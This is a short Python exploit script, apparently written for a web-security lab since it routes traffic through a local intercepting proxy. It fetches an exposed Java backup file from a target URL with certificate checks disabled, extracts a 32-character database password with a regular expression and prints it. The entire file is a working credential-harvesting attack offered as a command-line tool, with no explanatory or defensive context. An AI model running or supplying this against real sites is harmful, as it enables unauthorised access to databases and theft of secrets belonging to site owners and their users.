import requests
import urllib3
import re
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def find_databse_key(url):
    backup_file_url = url + "/backup/ProductTemplate.java.bak"
    res = requests.get(backup_file_url, verify=False, proxies=proxies)
    if res.status_code == 200:
        print("(+) Found the backup file...")
        database_password = re.search("[0-9a-zA-Z]{32}", res.text).group(0)
        print("(+) The following is the Database password:", database_password)
    else:
        print("(-) Could not able to exploit the vulnerability...")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://www.example.com")
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Try to exploit the vulnerability...")
    find_databse_key(url)
    
if __name__ == "__main__":
    main()